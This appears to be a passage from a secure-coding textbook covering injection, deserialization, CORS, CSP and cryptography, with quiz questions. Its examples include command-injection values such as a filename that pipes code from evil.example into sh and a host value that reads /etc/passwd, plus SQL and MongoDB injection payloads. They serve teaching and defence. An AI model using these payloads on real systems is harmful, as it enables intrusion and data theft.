Because one mistake is enough, assume one will happen and limit it: - Least-privilege database roles : the application role has SELECT/INSERT/UPDATE/DELETE on its tables only; no DROP , no superuser , no access to other schemas, no pg read file , no COPY TO PROGRAM . Separate roles for migrations (DDL) and runtime (DML). Chapter 7 of Part VIII. - Row-level security so even a successful injection cannot cross tenants (Part III chapter 15). - No stacked queries : most drivers disable multiple statements per call by default; keep it that way. - Input validation : type and format checks at the boundary (an ID matches ^ord [a-z0-9]{20}$ ) reduce the attack surface; they are not the primary control because legitimate strings contain quotes. - Error handling : never return database errors to clients; detailed errors turn blind injection into easy injection. - Statement timeouts limit time-based blind extraction and damage from heavy injected queries. - Query logging and anomaly detection : unusual query shapes ( UNION , pg sleep , information schema access from the app role) are detectable with database audit logging (pgAudit) or a WAF in front. - WAF rules catch common payloads; they are bypassable and noisy, a complement only.

Injection is not about SQL; it is about mixing data into any interpreted command: - MongoDB : db.users.find({ email: req.body.email }) where email is { "$ne": null } matches everything; $where with string JavaScript is injectable. Validate types (strings must be strings) and never pass raw request objects as queries. - LDAP filters, XPath , GraphQL resolvers that build strings, Elasticsearch query DSL from user JSON, Redis commands built from strings, and shell commands (chapter 12) share the pattern. The fix is always the same: structured APIs with parameters, allow-listed structure, and typed validation. - ORM filter injection : Django's filter( request.GET) lets users filter on arbitrary fields including password hash startswith . Allow-list filterable fields (Part III chapter 2).

- Grep for SQL text combined with interpolation: execute(f" , execute("..." % , .format( , template literals with ${ inside SQL strings, queryRawUnsafe , extra( , raw( with formatting. - Run SAST (Semgrep rulesets for SQL injection; Bandit B608) in CI. - Use sqlmap in a sandbox against your own test deployment to confirm endpoints are not injectable; never against systems you do not own. - Add integration tests feeding canonical payloads ( ' OR 1=1 -- , '; SELECT pg sleep(5) -- ) to every string parameter and asserting normal behaviour (not errors, not delays). - Review database role grants against least privilege.

- Parameterising most queries and formatting one: the reporting endpoint, the admin search, the migration script. - Dynamic ORDER BY and column selection from input. - Escaping quotes manually instead of parameterising (escaping is error-prone and charset-dependent). - Application connecting as the database owner or superuser. - Returning raw database errors to clients. - Treating ORM usage as a guarantee while using its raw escape hatches. - Validating input and believing that makes concatenation safe. questions Why does a parameterised query prevent injection regardless of input content? options It escapes quotes The statement and the values are sent separately; values can never alter the statement's structure It validates input It limits length answer explain The database treats parameters as data by construction. Which cannot be parameterised and therefore needs an allow-list? options A WHERE value An ORDER BY column name An INSERT value A LIMIT count (as int) answer explain Identifiers and keywords are structure, not values. Map input to a fixed set of allowed identifiers. An application connects to PostgreSQL as a superuser. A single injection flaw is found. What is the realistic impact? options Only that table's data Full database compromise and possibly file system or OS access via server-side functions Nothing; injection only reads data Only denial of service answer explain Least-privilege roles bound the blast radius; superuser removes all bounds. `db.users.find({ e

t: SSRF, Command Injection and Path Traversal
x: SQL injection, command injection, path traversal and SSRF are one bug in four costumes: user-controlled data is handed to something that interprets it (a database, a shell, a filesystem path resolver, an HTTP client with network access) in a position where it changes what is done rather than with what . x: Your code runs an external program with user input in the command line: an image converter, ping , a PDF tool, git , a backup script. import os, subprocess def convert(filename: str): os.system(f"convert uploads/{filename} -resize 200x200 thumbs/{filename}") # filename = "x.png; curl evil.example/s | sh" subprocess.run(f"ping -c 1 {host}", shell=True) # host = "8.8.8.8; cat /etc/passwd" ::: import subprocess, shlex def convert(path: Path): safe = validate_upload_id(path) # our generated ID, not the user's filename subprocess.run(["convert", str(UPLOAD_DIR / safe), "-resize", "200x200", str(THUMB_DIR / safe)], shell=False, check=True, timeout=30, capture_output=True) # argument list: no shell parsing at all def ping(host: str): if not re.fullmatch(r"[A-Za-z0-9.-]{1,253}", host): raise ValidationFailed("bad host") subprocess.run(["ping", "-c", "1", "--", host], shell=False, timeout=5) # '--' ends option parsing: host cannot be '-f' ::: Rules: - Never use a shell ( shell=True , os.system , child process.exec , backticks). Pass an argument array to execve -style APIs ( subprocess.run([...]) , child process.execFile / spawn ). The arguments are then data, not shell syntax. - Still validate arguments : without a shell, injection of commands is impossible, but argument injection remains: a filename starting with - becomes an option ( -o /etc/cron.d/x ). Use -- where supported, allow-list formats, and prefer your own identifiers over user-provided names. - Prefer libraries over binar

- Explain why deserializing untrusted data with formats that encode types or behaviour leads to code execution, and which formats and libraries are dangerous. - Design data interchange with plain, schema-validated formats. - Prevent mass assignment by binding requests to explicit input models rather than to database models. - Recognise related trust-the-client bugs: hidden fields, client-side totals, ID substitution in nested objects. ::: Chapters 11 and 12; Part III chapter 2. :::

Serialization turns objects into bytes; deserialization turns bytes back into objects. Some formats encode not just data but which class to instantiate and how : Python pickle , Java native serialization, PHP unserialize , Ruby Marshal , .NET BinaryFormatter , YAML with arbitrary tags ( yaml.load without a safe loader), and some JSON libraries configured with polymorphic type handling (Jackson's default typing). Deserializing attacker-controlled bytes in these formats means letting the attacker choose which code runs during reconstruction. Gadget chains in common libraries turn that into arbitrary command execution. import pickle, base64 @app.post("/session/restore") def restore(body: dict): state = pickle.loads(base64.b64decode(body["blob"])) # attacker crafts a pickle whose __reduce__ runs os.system return {"restored": state} import yaml config = yaml.load(user_supplied_text) # PyYAML < 6 default loader instantiates arbitrary Python objects via !!python/object tags ::: import json from pydantic import BaseModel class SessionState(BaseModel): model_config = ConfigDict(extra="forbid") cart: list[CartItem] locale: str = Field(pattern=r"^[a-z]{2}(-[A-Z]{2})?$") @app.post("/session/restore") def restore(body: SessionState): # JSON parsed to plain data, then validated into a known shape return {"restored": body.model_dump()} config = yaml.safe_load(user_supplied_text) # only plain scalars, lists and maps ::: Rules: 1. The same instinct that produces mass assignment produces: - Client-computed totals : the cart total, the discount, the price per item sent by the client and charged as-is. - Explain what the same-origin policy protects and what it does not. - Describe exactly how CORS works: simple requests, preflights, credentials, and the headers involved. - Configure CORS on an API correctly for a frontend on another origin, and recognise the misconfigurations that expose data. - Understand how CORS relates to CSRF, cookies and authentication. ::: Part II chapters 8 and 11; chapter 9 of this part. :::

A browser runs code from many sites at once. Without rules, a script on evil.example could make requests to bank.example using the user's cookies and read the responses : balances, messages, anything the user can see. The same-origin policy (SOP) is the browser rule that prevents this. But legitimate applications need cross-origin access too: an SPA on app.client.com calling api.client.com . CORS (Cross-Origin Resource Sharing) is the mechanism by which a server tells browsers which origins may read its responses. Misconfigured CORS silently reopens the hole SOP closed.

An origin is the triple (scheme, host, port). https://app.client.com and https://api.client.com are different origins; so are http://app.client.com and https://app.client.com ; and https://app.client.com:8443 . A site (for cookies' SameSite) is coarser: both app.client.com and api.client.com are the site client.com . Keep the two concepts separate; CORS is about origins.

- Scripts can send requests anywhere (forms, images, scripts, fetch), but can only read responses from their own origin, unless the response opts in via CORS. - Scripts cannot read another origin's DOM, cookies, or localStorage . - Some cross-origin reads are allowed historically: loading images, scripts, stylesheets, iframes (you can embed, not read). Consequence for security thinking: SOP protects confidentiality of responses , not integrity of requests . That is why CSRF exists (chapter 9) and why CORS does not prevent it.

The server must answer without requiring authentication (preflights carry none). label 204 Access-Control-Allow-Origin: https://app.client.com Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE Access-Control-Allow-Headers: content-type, x-csrf-token Access-Control-Allow-Credentials: true Access-Control-Max-Age: 600 Vary: Origin title Preflight response detail The server echoes the specific allowed origin (never * with credentials), lists allowed methods and headers, permits credentials, and lets the browser cache this decision for 600 seconds. GET, HEAD and POST with only safelisted headers and a content type of application/x-www-form-urlencoded , multipart/form-data or text/plain are sent without preflight (because HTML forms could always send them). The browser then checks the response's Access-Control-Allow-Origin before letting the script read it. This is why a JSON API should reject non-JSON content types: a text/plain POST sneaks past preflight.

Header Direction Meaning --- --- --- Origin request The requesting page's origin (set by the browser; cannot be forged by page script) Access-Control-Allow-Origin response The one origin allowed to read, or (never with credentials) Access-Control-Allow-Credentials: true response Cookies and Authorization may be sent and the response read Access-Control-Allow-Methods / -Headers preflight response What the actual request may use Access-Control-Expose-Headers response Which response headers script may read beyond the safelisted few (e.g. X-Request-Id , RateLimit-Remaining ) Access-Control-Max-Age preflight response Cache the preflight (browsers cap at 2 hours; 600 s is typical) Vary: Origin response Tell caches/CDNs the response differs per origin

Localhost origins only in development config. - Never Access-Control-Allow-Origin: with Allow-Credentials: true (browsers refuse the combination, but some servers reflect the request origin to emulate it; see below). - Never reflect the Origin header unconditionally. allow origins=[" "] plus credentials in some middlewares becomes "echo whatever origin asked", which lets any site read authenticated responses. Validate against the list and echo only matches. - Beware regex and suffix matching : /client\.com$/ matches evilclient.com ; .endswith("client.com") matches notclient.com . Match full origins. - null origin : sandboxed iframes and some file:// contexts send Origin: null ; never allow it. - Apply to error responses too , or the frontend cann

An API meant to be called from any website (a public data API with no cookies) can use Access-Control-Allow-Origin: without credentials. Authentication then happens via an Authorization header the calling script sets explicitly; since no cookies are involved, there is no CSRF and nothing to leak from the user's ambient session.

- Cookie-based session across origins ( app.client.com → api.client.com ): CORS with exact origins and credentials, SameSite=Lax cookies (same site, so they are sent), plus CSRF protection (custom header requirement or token). Works well. - Cookie-based across different sites ( app.example → api.client.com ): cookies need SameSite=None; Secure , which removes SameSite CSRF protection and runs into third-party cookie blocking. Avoid: put the API under the same site, or use a BFF, or use header tokens. - Header tokens : no cookies, CORS still needed to read responses, no CSRF, but XSS exposure of the token (chapter 10). Common for mobile and third-party clients. - Same origin via reverse proxy : serve the frontend and /api from one origin (CloudFront behaviours or Nginx locations). Eliminates CORS entirely for first-party apps and is often the simplest, safest design.

- Does not prevent CSRF (chapter 9). - Does not protect non-browser clients: curl ignores CORS entirely. Server-side authorization is unaffected and still required. - Does not hide the API: the request reaches the server; only the response reading is gated. - Does not replace authentication.

The browser console reports blocked by CORS policy with the specific reason: missing header, origin mismatch, credentials with wildcard, header not allowed, preflight failed (often a 401/404 on OPTIONS, or a redirect). Reproduce with curl -i -X OPTIONS -H 'Origin: https://app.client.com' -H 'Access-Control-Request-Method: PUT' https://api… and inspect the response headers; then the real request with -H 'Origin: …' . If curl shows the right headers but the browser still fails, check error responses and CDN caching.

- Reflecting any origin with credentials. - Wildcard with credentials via middleware shortcuts. - Suffix or regex matching of origins. - Allowing null . - Preflight blocked by authentication or redirected to HTTPS (preflights do not follow redirects well: serve CORS on both schemes or ensure clients use HTTPS). - Missing CORS headers on 4xx/5xx responses. - Missing Vary: Origin behind a CDN. - Treating CORS as the API's security. questions What does the same-origin policy actually restrict? options Sending cross-origin requests Reading cross-origin responses and DOM/storage from script All cross-origin network activity Cookies answer explain Requests can be sent (hence CSRF); reading is gated (hence CORS). A server echoes the request's Origin header into Access-Control-Allow-Origin and sets Allow-Credentials: true. What is the consequence? options Correct configuration Any website can make authenticated requests and read the responses: full cross-site data theft Browsers block it Only preflights fail answer explain Reflecting origins is equivalent to allowing everyone. Validate against an exact allow-list. Why does a POST with Content-Type text/plain bypass the preflight? options It is a bug Browsers classify it as a simple request because HTML forms could always send it text/plain is encrypted It does not bypass answer explain APIs should reject non-JSON content types to avoid simple-request CSRF paths. Which design avoids CORS entirely for a first-party SPA and API? options

Deliberately configure an origin-reflecting server and demonstrate from a third "attacker" origin that authenticated data can be read. Fix with an allow-list. 3. t: Security Headers and Content Security Policy
x: Browsers ship with many protections turned off for compatibility: they will happily execute inline scripts, load your page in a hostile iframe, send referrers to third parties, sniff content types, and connect over plain HTTP. A handful of response headers turn these protections on. They cost nothing, take an afternoon to deploy, and they are the difference between an XSS bug being an incident and being a log line. Security scanners and client questionnaires will check for them, but the reason to deploy them is that they work.

t: Security Headers and Content Security Policy
x: CSP tells the browser where each kind of resource may come from and whether inline code may run. Its main job is to make injected script inert.

t: Security Headers and Content Security Policy
h: A strong, practical policy for a SPA
x: Content-Security-Policy: default-src 'none'; script-src 'self' 'nonce-{random}' 'strict-dynamic'; style-src 'self' 'nonce-{random}'; img-src 'self' data: https://cdn.client.com; font-src 'self'; connect-src 'self' https://api.client.com wss://rt.client.com; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'; upgrade-insecure-requests; report-to csp-endpoint Reading it: nothing is allowed by default; scripts may come from our origin or carry this response's nonce, and scripts loaded by trusted scripts are trusted ( strict-dynamic ); styles likewise; images from us, data URIs and our CDN; XHR/fetch/WebSocket only to our API and realtime hosts; nobody may frame us; cannot be injected to redirect relative URLs; forms may only submit to us; no plugins; HTTP sub-resources are upgraded; violations are reported.

t: Security Headers and Content Security Policy
h: Nonces versus hashes versus host lists
x: - Nonces : a fresh random value per response, placed on each legitimate and tag and in the header. Requires server-side rendering of the HTML (or an edge function) to inject the nonce. The strongest practical approach. - Hashes : 'sha256-…' of each inline script's content. Works for static HTML with fixed inline scripts (and for inline event handlers via 'unsafe-hashes' , sparingly). - Host allow-lists ( script-src cdn.example.com ): weak; many CDNs host libraries with JSONP endpoints or Angular templates that allow bypasses. Use strict-dynamic with nonces/hashes instead, and keep host lists for images, fonts and connections. 'unsafe-inline' for scripts disables XSS protection entirely; 'unsafe-eval' allows eval and friends. Both should be absent from script-src . For style-src , 'unsafe-inline' is a common compromise when CSS-in-JS libraries demand it; the risk (CSS injection exfiltration) is lower but not zero.

Monitor reports in production: a spike indicates either a deploy that broke the policy or an actual injection attempt.

t: Security Headers and Content Security Policy
x: - CDN / edge (CloudFront response headers policy, Cloudflare): applies to everything including static files; cheap; one place to audit. Best for static sites and as a baseline. - Load balancer : ALBs cannot add arbitrary response headers (they can for some; check current capabilities), so this is usually not the layer. - Reverse proxy (Nginx add header … always , Caddy header ): good for VM deployments. Remember always so the headers are on error responses too, and that add header in a nested block replaces the parent's headers in Nginx. - Application middleware (Helmet for Express, secure for Python, framework settings): necessary when values vary per response (nonces) and good as a defence in depth under the edge configuration. Set them in one authoritative place and let others reinforce only where needed; conflicting values (two CSP headers) combine restrictively and confusingly.

- Choose the right primitive for each job: hashing, HMAC, symmetric authenticated encryption, asymmetric encryption, digital signatures, key exchange, randomness. - Use modern, misuse-resistant APIs correctly and recognise the classic misuses (ECB, reused nonces, unauthenticated encryption, non-cryptographic randomness, home-made schemes). - Implement encryption at rest and in transit with managed services and libraries, not by hand. - Know enough to evaluate claims, read a library's documentation critically, and avoid designing your own protocol. ::: Part II chapter 9; chapter 8 of this part. :::

Application engineers do not need to design ciphers; they need to pick the right tool from a small kit and use it without the handful of mistakes that make strong algorithms useless. Nearly every cryptographic failure in applications is a misuse : AES in ECB mode, a nonce reused, encryption without authentication, random.random() for a token, MD5 for integrity, a secret key committed to Git, or a bespoke protocol that looked fine. This chapter is the kit and the rules of use.

A hash maps arbitrary input to a fixed digest; it is one-way and collision-resistant. Uses: content addressing (Git, Docker layers), integrity of downloads (compare against a published digest obtained securely ), deduplication, commitment schemes. Not for passwords (chapter 8) and not for authentication: anyone can compute a hash of modified data. A MAC adds a secret key: only holders of the key can produce a valid tag, so a valid tag proves both integrity and origin. HMAC-SHA256 is the standard (webhook signatures in Part III chapter 10, signed cookies, CSRF tokens). Compare tags with a constant-time function ( hmac.compare digest , crypto.timingSafeEqual ); a normal == leaks the match position through timing. import hmac, hashlib, secrets def sign(msg: bytes, key: bytes) -> str: return hmac.new(key, msg, hashlib.sha256).hexdigest() def verify(msg: bytes, key: bytes, tag: str) -> bool: return hmac.compare_digest(sign(msg, key), tag) token = secrets.token_urlsafe(32) # 256 bits for session IDs, reset tokens, API keys

Use an AEAD (authenticated encryption with associated data): it encrypts and authenticates, so tampered ciphertext is rejected rather than decrypted into garbage or, worse, into attacker-chosen plaintext (padding oracle attacks on unauthenticated CBC are the textbook example). AES-GCM and ChaCha20-Poly1305 are the standard choices. The critical rule: never reuse a nonce with the same key. AES-GCM's 96-bit nonce must be unique per encryption under a key; reuse leaks the XOR of plaintexts and breaks authentication. Use a counter you can guarantee is unique, or random nonces with a key that encrypts a bounded number of messages (keep well under 2^32 random nonces per key), or XChaCha20-Poly1305 with its 192-bit nonce where random nonces are safe at any practical scale. Rotate keys periodically regardless. # cryptography library: AES-256-GCM with random nonce and associated data from cryptography.hazmat.primitives.ciphers.aead import AESGCM import os key = AESGCM.generate_key(bit_length=256) # from KMS/secrets manager in production def encrypt(plaintext: bytes, aad: bytes) -> bytes: nonce = os.urandom(12) return nonce + AESGCM(key).encrypt(nonce, plaintext, aad) # store nonce alongside ciphertext def decrypt(blob: bytes, aad: bytes) -> bytes: nonce, ct = blob[:12], blob[12:] return AESGCM(key).decrypt(nonce, ct, aad) # raises InvalidTag on tampering Associated data binds context to the ciphertext without encrypting it: encrypt a user's document with aad = user id + document id ,

Public/private key pairs: anyone can encrypt to or verify from the public key; only the private key decrypts or signs. - Signatures (Ed25519 preferred; ECDSA P-256 widely supported; RSA-PSS for compatibility): JWTs, software artifacts, webhooks where the receiver should not hold a secret capable of forging, audit log integrity. Verify with the correct public key for that identity , obtained from a trusted source; a signature from an unknown key proves nothing. - Encryption : rarely used directly. Encrypt data with a fresh symmetric key and encrypt that key to the recipient's public key (hybrid encryption; libsodium's sealed box or HPKE do this correctly). RSA-OAEP if you must use RSA; never PKCS 1 v1.5 encryption padding in new code. - Key exchange : X25519 ECDH; you encounter it inside TLS, SSH, WireGuard and Signal, almost never directly. Key sizes in 2026: Ed25519/X25519 (fixed), P-256, RSA ≥ 2048 (3072 for long-lived keys). Post-quantum algorithms (ML-KEM for key exchange, ML-DSA for signatures) are being deployed in TLS hybrids and will reach application libraries; design so that algorithms can be changed (version your formats).

Security tokens, salts, nonces, session IDs, API keys and password reset codes must come from a cryptographically secure random number generator: secrets in Python, crypto.randomBytes / crypto.randomUUID in Node, SecureRandom in Java, /dev/urandom or getrandom() at the OS level. random (Python), Math.random (JS) and java.util.Random are predictable and have been exploited to forge tokens. Use at least 128 bits (256 for long-lived tokens). UUIDv4 from a library that uses the CSPRNG is fine as an unguessable identifier; UUIDv1/v7 contain timestamps and are not secrets.

Managed services do this well; use them: RDS/EBS/S3 encryption with KMS keys (SSE-KMS gives per-key audit and access control), encrypted ElastiCache, encrypted backups and snapshots, encrypted EFS. This protects against disk theft, decommissioning mistakes and some misconfigured-access scenarios; it does not protect against an attacker with database credentials, because the database decrypts transparently for anyone who can query it. Application-level (field) encryption closes that gap for the most sensitive fields (national IDs, tokens for third-party systems, health data): encrypt in the application with a data key from KMS via envelope encryption, store ciphertext in the database, decrypt only when needed. Costs: you cannot index or search encrypted fields (deterministic encryption or blind indexes, HMAC of the value, allow equality lookups at the cost of revealing equality), key rotation requires re-encryption or key versioning, and bugs are harder to debug. Apply it to a short list of fields chosen in the threat model, not to everything.

TLS everywhere (Part II chapter 9), including internal hops where policy requires; database connections with sslmode=verify-full ; message brokers and caches with TLS enabled; SSH or SSM for administration. Certificate validation on, always. Mutual TLS where machine identity must be strong.

Keys are the secret; algorithms are public. Chapter 17 is devoted to it. The short rules: keys in a KMS or secrets manager, never in code or config files; separate keys per purpose and environment; rotation with key versioning so old data remains decryptable; access to keys audited; the application receives keys at runtime via an authenticated path (IAM role), not via a file on disk when avoidable.

1. Use a high-level, maintained library (libsodium/PyNaCl, Tink, cryptography , Node's crypto with AEAD modes, Web Crypto). Do not implement primitives. 2. Do not design protocols. Compose only in ways the library documents; when in doubt, use the library's highest-level construct. 3. Authenticate everything you encrypt (AEAD), and authenticate before you decrypt or parse. 4. Never reuse nonces; never reuse keys across purposes; never derive keys by truncating or concatenating. 5. Constant-time comparisons for secrets. 6. CSPRNG for anything an attacker must not guess. 7. Version your formats ( v1: prefix, key ID) so algorithms and keys can rotate. 8. Keep secrets out of logs, URLs, error messages and client code. 9. Verify signatures against pinned expected keys and algorithms. 10. Have a cryptographer or a security review look at anything that goes beyond these patterns.

- AES-ECB (identical blocks produce identical ciphertext; the penguin picture) or CBC without a MAC. - Static or reused IV/nonce. - random / Math.random for tokens. - MD5 or SHA-1 for signatures or integrity of security-relevant data. - hash(secret + data) instead of HMAC. - Comparing MACs with == . - Using RSA to encrypt payloads directly. - Encrypting with a key derived from a password without a KDF, or hard-coding keys. - Believing at-rest encryption protects against SQL injection or stolen database credentials. - Rolling a custom token format when a signed, versioned standard exists. questions Why must an AEAD mode (e.g. AES-GCM) be preferred over AES-CBC alone? options It is faster It authenticates the ciphertext so tampering is detected and padding-oracle style attacks are prevented CBC is deprecated by browsers GCM uses a longer key answer explain Unauthenticated encryption lets attackers modify ciphertext and learn from how decryption fails. Which is the correct way to compare an HMAC tag? options tag == expected A constant-time comparison function String startswith Hash both and compare lengths answer explain Early-exit comparisons leak how many leading bytes match through timing. What happens if a nonce is reused with the same AES-GCM key? options Nothing Confidentiality and integrity are broken for those messages (and authentication key recovery is possible) Slightly weaker encryption Decryption fails answer explain Nonce uniqueness per key is a hard requirement; u
